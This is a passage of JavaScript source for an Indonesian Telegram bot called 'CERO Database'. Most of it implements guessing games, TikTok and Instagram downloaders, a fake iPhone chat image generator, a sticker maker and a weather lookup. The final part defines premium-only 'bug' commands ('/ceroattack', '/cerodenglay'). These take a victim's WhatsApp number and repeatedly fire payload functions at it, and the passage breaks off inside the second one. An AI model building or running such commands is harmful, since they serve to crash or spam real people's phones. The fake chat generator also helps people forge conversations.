│ ‹𝟹 Prefix : 𝖲𝗅𝖺𝗌𝗁 ( / ) 
│ ‹𝟹 Type : 𝖡𝖾𝖻𝖺𝗌 𝖲𝗉𝖺𝗆 
╰─────────────────╯</strong></blockquote>

<blockquote><strong>╭──「 𝖦𝖠𝖬𝖤𝖲 𝖬𝖤𝖭𝖴 」──╮
│ ‹𝟹 /tebakkata — 𝗀𝖺𝗆𝖾𝗌 𝟣
│ ‹𝟹 /tebakangka — 𝗀𝖺𝗆𝖾𝗌 𝟤
│ ‹𝟹 /susunkata — 𝗀𝖺𝗆𝖾𝗌 𝟥
│ ‹𝟹 /tebaktebakan — 𝗀𝖺𝗆𝖾𝗌 𝟦
│ ‹𝟹 /hitungcepat — 𝗀𝖺𝗆𝖾𝗌 𝟧
╰─────────────────╯</strong></blockquote>`;

  try {
    await ctx.editMessageCaption(controlsMenu, {
      parse_mode: "HTML",
      reply_markup: buildBackKeyboard(),
    });
    await ctx.answerCbQuery();

    autoColorMessages.set(ctx.chat.id, ctx.callbackQuery.message.message_id);
    menuTypeMap.set(ctx.chat.id, "gemes");
    lastUpdateMap.set(ctx.chat.id, 0);
  } catch (e) {
    if (e.response?.error_code === 400 && e.response.description?.includes("not modified")) {
      await ctx.answerCbQuery();
    }
  }
});

// ===============================
// 🎮 GAME SYSTEM
// ===============================

const gameSessions = new Map();

// -------------------------------
// 1. TEBAK KATA
// -------------------------------
bot.command("tebakkata", async (ctx) => {
    const games = [
        { q: "Hewan yang dikenal sebagai raja hutan?", a: "singa" },
        { q: "Alat untuk melihat waktu?", a: "jam" },
        { q: "Buah berwarna kuning yang disukai monyet?", a: "pisang" },
        { q: "Hewan yang menghasilkan susu?", a: "sapi" },
        { q: "Tempat kita belajar?", a: "sekolah" }
    ];

    const game = games[Math.floor(Math.random() * games.length)];

    gameSessions.set(ctx.from.id, {
        type: "tebakkata",
        answer: game.a
    });

    await ctx.reply(
        `🎮 TEBAK KATA\n\n` +
        `❓ ${game.q}\n\n` +
        `💬 Balas dengan jawabanmu!`
    );
});


// -------------------------------
// 2. TEBAK ANGKA
// -------------------------------
bot.command("tebakangka", async (ctx) => {
    const number = Math.floor(Math.random() * 100) + 1;

    gameSessions.set(ctx.from.id, {
        type: "tebakangka",
        answer: number
    });

    await ctx.reply(
        `🎯 TEBAK ANGKA\n\n` +
        `Saya sudah memilih angka dari 1 - 100.\n\n` +
        `💬 Kirim angka tebakanmu!`
    );
});


// -------------------------------
// 3. SUSUN KATA
// -------------------------------
bot.command("susunkata", async (ctx) => {
    const words = [
        "telegram",
        "komputer",
        "sekolah",
        "indonesia",
        "permainan"
    ];

    const word = words[Math.floor(Math.random() * words.length)];

    const scrambled = word
        .split("")
        .sort(() => Math.random() - 0.5)
        .join("");

    gameSessions.set(ctx.from.id, {
        type: "susunkata",
        answer: word
    });

    await ctx.reply(
        `🔤 SUSUN KATA\n\n` +
        `Susun huruf berikut menjadi kata yang benar:\n\n` +
        `👉 ${scrambled}\n\n` +
        `💬 Kirim jawabanmu!`
    );
});


// -------------------------------
// 4. TEBAK-TEBAKAN
// -------------------------------
bot.command("tebaktebakan", async (ctx) => {
    const games = [
        {
            q: "Apa yang punya kaki tapi tidak bisa berjalan?",
            a: "meja"
        },
        {
            q: "Apa yang semakin diisi semakin ringan?",
            a: "balon"
        },
        {
            q: "Apa yang punya gigi tetapi tidak bisa makan?",
            a: "sisir"
        },
        {
            q: "Apa yang selalu naik tetapi tidak pernah turun?",
            a: "umur"
        },
        {
            q: "Apa yang bisa berjalan tanpa kaki?",
            a: "air"
        }
    ];

    const game = games[Math.floor(Math.random() * games.length)];

    gameSessions.set(ctx.from.id, {
        type: "tebaktebakan",
        answer: game.a
    });

    await ctx.reply(
        `🧠 TEBAK-TEBAKAN\n\n` +
        `❓ ${game.q}\n\n` +
        `💬 Kirim jawabanmu!`
    );
});


// -------------------------------
// 5. HITUNG CEPAT
// -------------------------------
bot.command("hitungcepat", async (ctx) => {
    const a = Math.floor(Math.random() * 50) + 1;
    const b = Math.floor(Math.random() * 50) + 1;

    const operators = ["+", "-", "*"];
    const operator = operators[Math.floor(Math.random() * operators.length)];

    let answer;

    if (operator === "+") answer = a + b;
    if (operator === "-") answer = a - b;
    if (operator === "*") answer = a * b;

    gameSessions.set(ctx.from.id, {
        type: "hitungcepat",
        answer: answer
    });

    await ctx.reply(
        `⚡ HITUNG CEPAT\n\n` +
        `🧮 Berapa hasil dari:\n\n` +
        `${a} ${operator} ${b} = ?\n\n` +
        `💬 Kirim jawabannya!`
    );
});


// ===============================
// CEK JAWABAN GAME
// ===============================
bot.on("text", async (ctx, next) => {
    const userId = ctx.from.id;
    const game = gameSessions.get(userId);

    // Tidak sedang bermain → lanjutkan ke handler command
    if (!game) return next();

    const input = ctx.message.text.trim().toLowerCase();

    let correct = false;

    if (game.type === "tebakangka" || game.type === "hitungcepat") {
        const number = Number(input);

        if (!isNaN(number) && number === game.answer) {
            correct = true;
        }
    } else {
        if (input === String(game.answer).toLowerCase()) {
            correct = true;
        }
    }

    if (correct) {
        gameSessions.delete(userId);

        return ctx.reply(
            `🎉 BENAR!\n\n` +
            `Jawaban: ${game.answer}\n\n` +
            `🏆 Selamat, kamu berhasil!`
        );
    }

    // Khusus tebak angka kasih petunjuk
    if (game.type === "tebakangka") {
        const number = Number(input);

        if (!isNaN(number)) {
            if (number < game.answer) {
                return ctx.reply("❌ Salah!\n\n📈 Angkanya lebih besar.");
            }

            if (number > game.answer) {
                return ctx.reply("❌ Salah!\n\n📉 Angkanya lebih kecil.");
            }
        }
    }

    return ctx.reply("❌ Jawaban salah, coba lagi!");
});

// ─── COMMAND: /tiktok ──────────────────────────────────────────────────────
bot.command('tiktokdl', async (ctx) => {
  const user = ctx.from;
  const username = user.username ? `@${user.username}` : user.first_name || 'User';
  
  const args = ctx.message.text.split(' ').slice(1).join(' ').trim();
  
  if (!args) {
    return ctx.reply(`<b><u>𝖢𝖤𝖱𝖮 𝖣𝖠𝖳𝖠𝖡𝖠𝖲𝖤</u></b>
──────────────────────────
—( ⸙ ) <b>📥 TIKTOK DOWNLOADER</b>

Format:
<code>/tiktok &lt;link&gt;</code>

Contoh:
<code>/tiktok https://vt.tiktok.com/xxxxx</code>
──────────────────────────`, { parse_mode: 'HTML' });
  }

  const tiktokRegex = /(https?:\/\/)?(www\.|vm\.|vt\.)?tiktok\.com\/[^\s]+/i;
  if (!tiktokRegex.test(args)) {
    return ctx.reply('❌ Link tidak valid. Pastikan itu link TikTok.');
  }

  const loadingMsg = await ctx.reply(`⏳ <b>Memproses video TikTok...</b>`, { parse_mode: 'HTML' });

  // Multiple API fallback
  const API_ENDPOINTS = [
    {
      name: 'TikWM',
      url: `https://www.tikwm.com/api/?url=${encodeURIComponent(args)}&hd=1`,
      parse: (data) => {
        if (data.code !== 0 || !data.data) return null;
        const v = data.data;
        let videoUrl = v.play || v.hdplay;
        if (videoUrl && !videoUrl.startsWith('http')) videoUrl = `https://www.tikwm.com${videoUrl}`;
        return {
          videoUrl,
          title: v.title || 'TikTok Video',
          author: v.author?.nickname || v.author?.unique_id || 'Unknown',
          authorUsername: v.author?.unique_id || '',
          duration: v.duration || 0,
          playCount: v.play_count || 0,
          likeCount: v.digg_count || 0
        };
      }
    }
  ];

  let videoData = null;
  let lastError = '';

  for (const api of API_ENDPOINTS) {
    try {
      const { data } = await axios.get(api.url, {
        timeout: 20000,
        headers: { 'User-Agent': 'Mozilla/5.0' }
      });
      const parsed = api.parse(data);
      if (parsed && parsed.videoUrl) {
        videoData = parsed;
        break;
      }
    } catch (e) {
      lastError = e.message;
      console.error(`API ${api.name} gagal:`, e.message);
      continue;
    }
  }

  if (!videoData) {
    await ctx.telegram.editMessageText(
      ctx.chat.id, loadingMsg.message_id, null,
      `❌ <b>Gagal mengambil video</b>\n\nServer downloader mungkin sedang sibuk. Coba lagi nanti.`,
      { parse_mode: 'HTML' }
    ).catch(() => {});
    return;
  }

  try {
    // Download video
    const videoRes = await axios.get(videoData.videoUrl, {
      responseType: 'arraybuffer',
      timeout: 120000,
      maxContentLength: 100 * 1024 * 1024, // 100MB
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': 'https://www.tikwm.com/'
      }
    });

    const videoBuffer = Buffer.from(videoRes.data);
    const sizeMB = videoBuffer.length / 1024 / 1024;

    await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => {});

    const caption = `<b><u>𝖢𝖤𝖱𝖮 𝖣𝖠𝖳𝖠𝖡𝖠𝖲𝖤</u></b>
──────────────────────────
—( ⸙ ) <b>✅ TIKTOK BERHASIL</b>

🎬 <b>Judul</b>: ${videoData.title.substring(0, 80)}
👤 <b>Author</b>: ${videoData.author} ${videoData.authorUsername ? `(@${videoData.authorUsername})` : ''}
⏱️ <b>Durasi</b>: ${videoData.duration}s
📦 <b>Ukuran</b>: ${sizeMB.toFixed(2)} MB
▶️ <b>Play</b>: ${videoData.playCount.toLocaleString('id-ID')}
❤️ <b>Like</b>: ${videoData.likeCount.toLocaleString('id-ID')}
──────────────────────────
<i>© CERO Database</i>`;

    // Kalau >50MB, kirim link aja (biar gak error)
    if (sizeMB > 50) {
      await ctx.reply(`<b><u>𝖢𝖤𝖱𝖮 𝖣𝖠𝖳𝖠𝖡𝖠𝖲𝖤</u></b>
──────────────────────────
—( ⸙ ) <b>⚠️ VIDEO TERLALU BESAR</b>

Ukuran: <code>${sizeMB.toFixed(2)} MB</code>
Max: <code>50 MB</code>

📥 <b>Link Download:</b>
<code>${videoData.videoUrl}</code>
──────────────────────────`, { parse_mode: 'HTML' });
      return;
    }

    // Kirim video
    if (sizeMB > 20) {
      // 20-50MB → document
      await ctx.replyWithDocument(
        { source: videoBuffer, filename: `tiktok_${Date.now()}.mp4` },
        { caption, parse_mode: 'HTML' }
      );
    } else {
      // <20MB → video streaming
      await ctx.replyWithVideo(
        { source: videoBuffer },
        { caption, parse_mode: 'HTML', supports_streaming: true }
      );
    }

  } catch (err) {
    console.error('Error /tiktok:', err);
    
    let errorMsg = err.message;
    if (err.code === 'ECONNABORTED') errorMsg = 'Timeout. Server lambat.';
    else if (err.response?.status === 413) errorMsg = 'File terlalu besar untuk Telegram.';
    else if (err.response?.status === 404) errorMsg = 'Video tidak ditemukan.';

    await ctx.telegram.editMessageText(
      ctx.chat.id, loadingMsg.message_id, null,
      `❌ <b>GAGAL</b>\n\n<b>Error:</b> ${errorMsg}\n\n📥 Link manual:\n<code>${videoData?.videoUrl || '-'}</code>`,
      { parse_mode: 'HTML' }
    ).catch(() => {});
  }
});

// ─── COMMAND: /ig ──────────────────────────────────────────────────────────
bot.command('igdl', async (ctx) => {
  const user = ctx.from;
  const username = user.username ? `@${user.username}` : user.first_name || 'User';
  
  const args = ctx.message.text.split(' ').slice(1).join(' ').trim();
  
  if (!args) {
    return ctx.reply(`<b><u>𝖢𝖤𝖱𝖮 𝖣𝖠𝖳𝖠𝖡𝖠𝖲𝖤</u></b>
──────────────────────────
—( ⸙ ) <b>📥 INSTAGRAM DOWNLOADER</b>

Format:
<code>/ig &lt;link&gt;</code>

Contoh:
<code>/ig https://www.instagram.com/p/xxxxx</code>
<code>/ig https://www.instagram.com/reel/xxxxx</code>

<i>Support: Post, Reel, IGTV, Carousel</i>
──────────────────────────`, { parse_mode: 'HTML' });
  }

  // Validasi URL Instagram
  const igRegex = /(https?:\/\/)?(www\.)?instagram\.com\/(p|reel|tv|share)\/[^\s]+/i;
  if (!igRegex.test(args)) {
    return ctx.reply('❌ Link tidak valid. Pastikan itu link Instagram post/reel.');
  }

  const loadingMsg = await ctx.reply(`⏳ <b>Memproses Instagram...</b>`, { parse_mode: 'HTML' });

  // Multiple API fallback
  const API_ENDPOINTS = [
    {
      name: 'Siputzx',
      url: `https://api.siputzx.my.id/api/d/igdl?url=${encodeURIComponent(args)}`,
      parse: (data) => {
        if (!data.status || !data.data) return null;
        return data.data.map(item => ({
          url: item.url,
          type: item.url.includes('.mp4') || item.url.includes('video') ? 'video' : 'image'
        }));
      }
    },
    {
      name: 'Agatz',
      url: `https://api.agatz.xyz/api/instagram?url=${encodeURIComponent(args)}`,
      parse: (data) => {
        if (data.status !== 200 || !data.data) return null;
        return data.data.map(item => ({
          url: item.url || item.download_url,
          type: (item.url || item.download_url).includes('.mp4') ? 'video' : 'image'
        }));
      }
    }
  ];

  let mediaList = null;
  let lastError = '';

  for (const api of API_ENDPOINTS) {
    try {
      const { data } = await axios.get(api.url, {
        timeout: 25000,
        headers: { 'User-Agent': 'Mozilla/5.0' }
      });
      const parsed = api.parse(data);
      if (parsed && parsed.length > 0) {
        mediaList = parsed;
        console.log(`✅ IG API ${api.name} berhasil, ${parsed.length} media`);
        break;
      }
    } catch (e) {
      lastError = e.message;
      console.error(`API ${api.name} gagal:`, e.message);
      continue;
    }
  }

  if (!mediaList || mediaList.length === 0) {
    await ctx.telegram.editMessageText(
      ctx.chat.id, loadingMsg.message_id, null,
      `❌ <b>Gagal mengambil media</b>\n\nKemungkinan:\n• Post private\n• Link invalid\n• Server downloader sibuk\n\nCoba lagi nanti.`,
      { parse_mode: 'HTML' }
    ).catch(() => {});
    return;
  }

  // Hapus loading
  await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => {});

  // Kalau cuma 1 media
  if (mediaList.length === 1) {
    const media = mediaList[0];
    try {
      const mediaRes = await axios.get(media.url, {
        responseType: 'arraybuffer',
        timeout: 120000,
        maxContentLength: 100 * 1024 * 1024,
        headers: { 'User-Agent': 'Mozilla/5.0' }
      });
      const buffer = Buffer.from(mediaRes.data);
      const sizeMB = buffer.length / 1024 / 1024;

      const caption = `<b><u>𝖢𝖤𝖱𝖮 𝖣𝖠𝖳𝖠𝖡𝖠𝖲𝖤</u></b>
──────────────────────────
—( ⸙ ) <b>✅ INSTAGRAM BERHASIL</b>

📦 <b>Ukuran</b>: ${sizeMB.toFixed(2)} MB
📊 <b>Tipe</b>: ${media.type === 'video' ? '🎥 Video' : '🖼️ Image'}
──────────────────────────
<i>© CERO Database - IG DL</i>`;

      if (sizeMB > 50) {
        await ctx.reply(`⚠️ File terlalu besar (${sizeMB.toFixed(2)} MB)\n\n📥 Link:\n<code>${media.url}</code>`, { parse_mode: 'HTML' });
      } else if (media.type === 'video') {
        if (sizeMB > 20) {
          await ctx.replyWithDocument(
            { source: buffer, filename: `ig_${Date.now()}.mp4` },
            { caption, parse_mode: 'HTML' }
          );
        } else {
          await ctx.replyWithVideo(
            { source: buffer },
            { caption, parse_mode: 'HTML', supports_streaming: true }
          );
        }
      } else {
        await ctx.replyWithPhoto(
          { source: buffer },
          { caption, parse_mode: 'HTML' }
        );
      }

    } catch (err) {
      console.error('Error download IG:', err);
      await ctx.reply(`❌ Gagal download. Link manual:\n<code>${media.url}</code>`, { parse_mode: 'HTML' });
    }
  } 
  // Kalau carousel (multi media)
  else {
    // Kirim notif dulu
    await ctx.reply(`<b><u>𝖢𝖤𝖱𝖮 𝖣𝖠𝖳𝖠𝖡𝖠𝖲𝖤</u></b>
──────────────────────────
—( ⸙ ) <b>📦 CAROUSEL DETECTED</b>

Menemukan <b>${mediaList.length}</b> media.
Mengirim satu per satu...
──────────────────────────`, { parse_mode: 'HTML' });

    // Kirim sebagai album (max 10 media per album)
    const albumChunks = [];
    for (let i = 0; i < mediaList.length; i += 10) {
      albumChunks.push(mediaList.slice(i, i + 10));
    }

    let sentCount = 0;
    
    for (const chunk of albumChunks) {
      const mediaGroup = [];
      
      for (const media of chunk) {
        try {
          const mediaRes = await axios.get(media.url, {
            responseType: 'arraybuffer',
            timeout: 60000,
            maxContentLength: 50 * 1024 * 1024,
            headers: { 'User-Agent': 'Mozilla/5.0' }
          });
          const buffer = Buffer.from(mediaRes.data);
          
          if (media.type === 'video') {
            mediaGroup.push({
              type: 'video',
              media: { source: buffer },
              supports_streaming: true
            });
          } else {
            mediaGroup.push({
              type: 'photo',
              media: { source: buffer }
            });
          }
          sentCount++;
        } catch (e) {
          console.error(`Gagal download media ${sentCount + 1}:`, e.message);
        }
      }
      
      if (mediaGroup.length > 0) {
        try {
          // Kalau cuma 1 di grup, kirim langsung
          if (mediaGroup.length === 1) {
            const item = mediaGroup[0];
            if (item.type === 'video') {
              await ctx.replyWithVideo(item.media, { supports_streaming: true });
            } else {
              await ctx.replyWithPhoto(item.media);
            }
          } else {
            // Album
            await ctx.replyWithMediaGroup(
              mediaGroup.map((item, i) => ({
                ...item,
                caption: i === 0 ? `📦 Carousel IG (${sentCount}/${mediaList.length})` : undefined,
                parse_mode: 'HTML'
              }))
            );
          }
          // Delay anti-flood
          await new Promise(r => setTimeout(r, 1000));
        } catch (e) {
          console.error('Error kirim album:', e.message);
        }
      }
    }

    await ctx.reply(`✅ <b>Selesai!</b>\n\nTotal terkirim: <b>${sentCount}/${mediaList.length}</b>`, { parse_mode: 'HTML' });
    await sendReport(ctx, '/ig', `Carousel: ${sentCount}/${mediaList.length} media terkirim`);
  }
});

// ─── COMMAND: /iqc (iPhone Quoted Chat) ────────────────────────────────────
bot.command('iqc', async (ctx) => {

  const chatId = ctx.chat.id;
  const user = ctx.from;
  const username = user.username ? `@${user.username}` : user.first_name || 'User';

  const text = ctx.message.text.split(' ').slice(1).join(' ').trim();

  if (!text) {
    return ctx.reply(`<b><u>𝖢𝖤𝖱𝖮 𝖣𝖠𝖳𝖠𝖡𝖠𝖲𝖤</u></b>
──────────────────────────
—( ⸙ ) <b>📱 IPHONE QUOTED CHAT</b>

Format:
<code>/iqc waktu|baterai|provider|pesan</code>

Contoh:
<code>/iqc 18:00|40|Indosat|Turzz Ganteng</code>

<i>Buat chat iPhone palsu dengan gaya quote.</i>
──────────────────────────`, { parse_mode: 'HTML' });
  }

  const [time, battery, carrier, ...msgParts] = text.split('|');

  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(`<b><u>𝖢𝖤𝖱𝖮 𝖣𝖠𝖳𝖠𝖡𝖠𝖲𝖤</u></b>
──────────────────────────
—( ⸙ ) <b>❌ FORMAT SALAH</b>

Format:
<code>/iqc waktu|baterai|provider|pesan</code>

Contoh:
<code>/iqc 18:00|40|Indosat|Turzz Ganteng</code>
──────────────────────────`, { parse_mode: 'HTML' });
  }

  // Validasi baterai harus angka
  if (isNaN(parseInt(battery))) {
    return ctx.reply('❌ Baterai harus berupa angka (contoh: 40).');
  }

  const loadingMsg = await ctx.reply('⏳ <b>Membuat iPhone quoted...</b>', { parse_mode: 'HTML' });

  const messageText = encodeURIComponent(msgParts.join('|').trim());

  const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(carrier)}&messageText=${messageText}&emojiStyle=apple`;

  try {
    const res = await axios.get(url, {
      responseType: 'arraybuffer',
      timeout: 30000,
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });

    if (!res.data || res.data.length < 1000) {
      throw new Error('Response tidak valid dari API');
    }

    const buffer = Buffer.from(res.data);

    // Hapus loading
    await ctx.telegram.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    // Kirim foto
    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption: `<b><u>𝖢𝖤𝖱𝖮 𝖣𝖠𝖳𝖠𝖡𝖠𝖲𝖤</u></b>
──────────────────────────
—( ⸙ ) <b>✅ IPHONE QUOTED</b>

⏰ <b>Waktu</b>: ${time}
🔋 <b>Baterai</b>: ${battery}%
📶 <b>Provider</b>: ${carrier}
💬 <b>Pesan</b>: ${msgParts.join('|').trim()}

<i>© CERO Database - iPhone Quoted</i>`,
        parse_mode: 'HTML'
      }
    );

  } catch (err) {
    console.error('Error /iqc:', err.message);

    let errorMsg = 'Terjadi kesalahan saat menghubungi API.';
    if (err.code === 'ECONNABORTED' || err.message.includes('timeout')) {
      errorMsg = 'Request timeout. Server API sedang sibuk.';
    } else if (err.message.includes('Response tidak valid')) {
      errorMsg = 'API mengembalikan data kosong. Coba lagi.';
    }

    await ctx.telegram.editMessageText(
      chatId,
      loadingMsg.message_id,
      null,
      `❌ <b>GAGAL MEMBUAT IPHONE QUOTED</b>\n\nError: ${errorMsg}\n\nCoba lagi nanti.`,
      { parse_mode: 'HTML' }
    ).catch(() => {
      ctx.reply(`❌ Gagal membuat iPhone quoted: ${errorMsg}`);
    });
  }
});

// ─── COMMAND: /brat ────────────────────────────────────────────────────────
bot.command('brat', async (ctx) => {
  const chatId = ctx.chat.id;
  const user = ctx.from;
  const username = user.username ? `@${user.username}` : user.first_name || 'User';
  
  const text = ctx.message.text.split(' ').slice(1).join(' ').trim();

  if (!text) {
    return ctx.reply(`<b><u>𝖢𝖤𝖱𝖮 𝖣𝖠𝖳𝖠𝖡𝖠𝖲𝖤</u></b>
──────────────────────────
—( ⸙ ) <b>🎨 BRAT STICKER</b>

Format:
<code>/brat &lt;teks&gt;</code>

Contoh:
<code>/brat TurzzNotDev</code>
<code>/brat Halo semua!</code>

<i>Membuat stiker dengan gaya brat.</i>
──────────────────────────`, { parse_mode: 'HTML' });
  }

  // Batasi panjang teks
  if (text.length > 100) {
    return ctx.reply('❌ Teks terlalu panjang! Maksimal 100 karakter.');
  }

  let filePath;
  const loadingMsg = await ctx.reply('✨ <b>Membuat stiker...</b>', { parse_mode: 'HTML' });

  try {
    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;

    const response = await axios.get(url, {
      responseType: 'arraybuffer',
      timeout: 30000,
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });

    // Validasi response
    if (!response.data || response.data.length < 1000) {
      throw new Error('Response tidak valid dari API');
    }

    filePath = path.join(__dirname, `brat_${Date.now()}_${user.id}.webp`);
    fs.writeFileSync(filePath, response.data);

    // Hapus pesan loading
    await ctx.telegram.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    // Kirim sticker
    await ctx.replyWithSticker({ source: filePath });

  } catch (err) {
    console.error('Error /brat:', err.message);

    // Edit pesan loading jadi error
    await ctx.telegram.editMessageText(
      chatId,
      loadingMsg.message_id,
      null,
      `❌ <b>GAGAL MEMBUAT STIKER</b>\n\nError: ${err.message}\n\nCoba lagi nanti atau pakai teks yang lebih pendek.`,
      { parse_mode: 'HTML' }
    ).catch(() => {
      ctx.reply(`❌ Gagal membuat stiker brat: ${err.message}`);
    });

  } finally {
    // Hapus file temp
    if (filePath && fs.existsSync(filePath)) {
      try { fs.unlinkSync(filePath); } catch (e) {}
    }
  }
});

// ─── COMMAND: /cuaca ───────────────────────────────────────────────────────
bot.command('cuaca', async (ctx) => {
  const user = ctx.from;
  const username = user.username ? `@${user.username}` : user.first_name || 'User';
  const city = ctx.message.text.split(' ').slice(1).join(' ').trim();

  if (!city) {
    return ctx.reply(`<b><u>𝖢𝖤𝖱𝖮 𝖣𝖠𝖳𝖠𝖡𝖠𝖲𝖤</u></b>
──────────────────────────
—( ⸙ ) <b>🌤️ CEK CUACA</b>

Format:
<code>/cuaca &lt;nama kota&gt;</code>

Contoh:
<code>/cuaca Jakarta</code>
<code>/cuaca Surabaya</code>
<code>/cuaca Tokyo</code>
──────────────────────────`, { parse_mode: 'HTML' });
  }

  const loadingMsg = await ctx.reply(`⏳ <b>Mencari cuaca di ${city}...</b>`, { parse_mode: 'HTML' });

  try {
    // Step 1: Geocoding — city name → latitude/longitude
    const geoUrl = `https://geocoding-api.open-meteo.com/v1/search?name=${encodeURIComponent(city)}&count=1&language=id&format=json`;
    const geoRes = await axios.get(geoUrl, { timeout: 15000 });

    if (!geoRes.data.results || geoRes.data.results.length === 0) {
      await ctx.telegram.editMessageText(
        ctx.chat.id, loadingMsg.message_id, null,
        `❌ Kota <b>${city}</b> tidak ditemukan.\n\nCoba pakai nama kota lain.`,
        { parse_mode: 'HTML' }
      );
      return;
    }

    const loc = geoRes.data.results[0];
    const { latitude, longitude, name, country, admin1, timezone } = loc;

    // Step 2: Forecast — ambil data cuaca
    const weatherUrl = `https://api.open-meteo.com/v1/forecast?latitude=${latitude}&longitude=${longitude}` +
      `&current=temperature_2m,relative_humidity_2m,apparent_temperature,weather_code,wind_speed_10m,wind_direction_10m` +
      `&daily=weather_code,temperature_2m_max,temperature_2m_min,precipitation_probability_max` +
      `&timezone=auto&forecast_days=3`;

    const weatherRes = await axios.get(weatherUrl, { timeout: 15000 });
    const w = weatherRes.data;

    // Step 3: Mapping weather code → deskripsi + emoji
    const weatherMap = {
      0: { desc: 'Cerah', emoji: '☀️' },
      1: { desc: 'Cerah Berawan', emoji: '🌤️' },
      2: { desc: 'Berawan', emoji: '⛅' },
      3: { desc: 'Mendung', emoji: '☁️' },
      45: { desc: 'Berkabut', emoji: '🌫️' },
      48: { desc: 'Kabut Tebal', emoji: '🌫️' },
      51: { desc: 'Gerimis Ringan', emoji: '🌦️' },
      53: { desc: 'Gerimis', emoji: '🌦️' },
      55: { desc: 'Gerimis Lebat', emoji: '🌧️' },
      61: { desc: 'Hujan Ringan', emoji: '🌧️' },
      63: { desc: 'Hujan Sedang', emoji: '🌧️' },
      65: { desc: 'Hujan Lebat', emoji: '🌧️' },
      71: { desc: 'Salju Ringan', emoji: '🌨️' },
      73: { desc: 'Salju Sedang', emoji: '🌨️' },
      75: { desc: 'Salju Lebat', emoji: '❄️' },
      80: { desc: 'Hujan Lokal', emoji: '🌦️' },
      81: { desc: 'Hujan Deras', emoji: '🌧️' },
      82: { desc: 'Hujan Sangat Deras', emoji: '⛈️' },
      95: { desc: 'Badai Petir', emoji: '⛈️' },
      96: { desc: 'Badai Petir + Hujan Es', emoji: '⛈️' },
      99: { desc: 'Badai Petir Hebat', emoji: '⛈️' }
    };

    const getWeather = (code) => weatherMap[code] || { desc: 'Tidak Diketahui', emoji: '❓' };

    // Step 4: Susun respons
    const current = w.current;
    const daily = w.daily;
    const currentWeather = getWeather(current.weather_code);

    // Wind direction
    const windDir = (deg) => {
      const dirs = ['Utara', 'Timur Laut', 'Timur', 'Tenggara', 'Selatan', 'Barat Daya', 'Barat', 'Barat Laut'];
      return dirs[Math.round(deg / 45) % 8];
    };

    // Format tanggal
    const formatDate = (dateStr) => {
      const d = new Date(dateStr);
      const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
      const months = ['Jan', 'Feb', 'Mar', 'Apr', 'Mei', 'Jun', 'Jul', 'Agu', 'Sep', 'Okt', 'Nov', 'Des'];
      return `${days[d.getDay()]}, ${d.getDate()} ${months[d.getMonth()]}`;
    };

    // Forecast 3 hari
    let forecastText = '';
    for (let i = 0; i < Math.min(3, daily.time.length); i++) {
      const dayWeather = getWeather(daily.weather_code[i]);
      const rain = daily.precipitation_probability_max[i] ?? 0;
      forecastText += `\n${dayWeather.emoji} <b>${formatDate(daily.time[i])}</b>\n`;
      forecastText += `   🌡️ ${daily.temperature_2m_min[i]}°C - ${daily.temperature_2m_max[i]}°C\n`;
      forecastText += `   🌧️ Peluang hujan: ${rain}%\n`;
    }

    // Info lokasi
    const locationFull = [name, admin1, country].filter(Boolean).join(', ');

    const msg = `<b><u>𝖢𝖤𝖱𝖮 𝖣𝖠𝖳𝖠𝖡𝖠𝖲𝖤</u></b>
──────────────────────────
—( ⸙ ) <b>🌤️ INFO CUACA</b>

📍 <b>Lokasi</b>: ${locationFull}
🕐 <b>Zona Waktu</b>: ${timezone}

<b>${currentWeather.emoji} KONDISI SAAT INI</b>
• Cuaca: <b>${currentWeather.desc}</b>
• Suhu: <b>${current.temperature_2m}°C</b>
• Terasa: <b>${current.apparent_temperature}°C</b>
• Kelembaban: <b>${current.relative_humidity_2m}%</b>
• Angin: <b>${current.wind_speed_10m} km/j</b> (${windDir(current.wind_direction_10m)})

<b>📅 PRAKIRAAN 3 HARI</b>
${forecastText}
──────────────────────────
<i>© CERO Database - Weather</i>`;

    await ctx.telegram.editMessageText(
      ctx.chat.id, loadingMsg.message_id, null, msg,
      { parse_mode: 'HTML' }
    );

   } catch (err) {
    console.error('Error /cuaca:', err.message);

    let errorMsg = 'Terjadi kesalahan saat mengambil data cuaca.';
    if (err.code === 'ECONNABORTED' || err.message.includes('timeout')) {
      errorMsg = 'Request timeout. Server cuaca sedang sibuk.';
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id, loadingMsg.message_id, null,
      `❌ <b>GAGAL MENGAMBIL DATA CUACA</b>\n\nError: ${errorMsg}\n\nCoba lagi nanti.`,
      { parse_mode: 'HTML' }
    ).catch(() => {
      ctx.reply(`❌ Gagal mengambil data cuaca: ${errorMsg}`);
    });
  }
});

// COMMAND BUGS 1
bot.command("ceroattack", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Example : /ceroattack 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`<blockquote><strong>✅ (bug) selesai untuk : ${q}</strong></blockquote>`, 
    {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "「 👾 」CHECK TERGET", url: `https://wa.me/${q}`, style: "success" }]],
    },
  });

  (async () => {
    for (let i = 0; i < 3; i++) {
      await comnoturr(sock, target);
      await delayinvis(sock, target);
    }
  })();
});
// COMMAND BUGS 2
bot.command("cerodenglay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Example : /cerodenglay 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
